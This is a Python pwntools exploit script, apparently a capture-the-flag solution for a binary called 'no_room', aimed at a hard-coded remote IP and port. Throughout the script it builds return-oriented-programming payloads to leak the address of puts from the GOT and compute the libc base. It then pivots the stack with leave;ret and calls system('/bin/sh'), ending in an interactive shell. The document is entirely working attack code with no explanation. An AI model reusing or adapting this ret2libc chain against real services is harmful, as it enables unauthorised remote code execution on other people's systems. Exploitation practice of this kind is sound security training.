from pwn import *


REMOTE = "r"
LOCAL = "l"

IP = "141.85.224.104"
PORT = 33334


def exploit(arg: str):
    
	binary = context.binary = ELF("./no_room")
	elf = ELF("./no_room", checksec=False)
	libc = ELF("./libc.so.6")
	ropper = ROP("./no_room")

	if arg == LOCAL:
		p = process()

	if arg == REMOTE:
		p = remote(IP, PORT)
	print(f"[RECEIVE MESSAGE] {p.recvline().decode()}")
	print(f"[RECEIVE MESSAGE] {p.recvline().decode()}")

	# GET Gadgets
	POP_RDI = p64(ropper.find_gadget(['pop rdi', 'ret'])[0])
	LEAVE_RET = p64(ropper.find_gadget(['leave', 'ret'])[0])
	FUNC_GOT = p64(elf.got["puts"])
	PUTS_PLT = p64(elf.plt.puts)
	MAIN = p64(0x4005f8)
	DATA_VARIABLE_ADDRESS = p64(0x602080)
	DATA_VARIABLE_LEN = 0x7f

	leak_payload = b"A" * 8 + POP_RDI + FUNC_GOT + PUTS_PLT + MAIN
	p.sendline(leak_payload)

	print(f"[RECEIVE MESSAGE] {p.recvline().decode()}")	
	stack_payload = b'a' * 0x30 + DATA_VARIABLE_ADDRESS + LEAVE_RET
	p.sendline(stack_payload)
	print(f"[RECEIVE MESSAGE] {p.recvline().decode()}")	

	puts_addr = u64(p.recvline().ljust(8, b"\x00"))
	libc.address = puts_addr - libc.symbols['puts']
	print(hex(libc.address))
	system_addr = libc.symbols['system']
	bin_sh_addr = next(libc.search(b'/bin/sh\x00'))

	print(f"[RECEIVE MESSAGE] {p.recvline().decode()}")	
	print(f"[RECEIVE MESSAGE] {p.recvline().decode()}")	


	final_payload =  b'a' * 0x30 + POP_RDI + p64(bin_sh_addr) + p64(system_addr)	
	final_payload += b'a' * (0x7f - len(final_payload))
	p.sendline(final_payload)
	
	print(f"[RECEIVE MESSAGE] {p.recvline().decode()}")	

	p.sendline(b'')
	p.recvline()

	p.interactive()
	


exploit('r')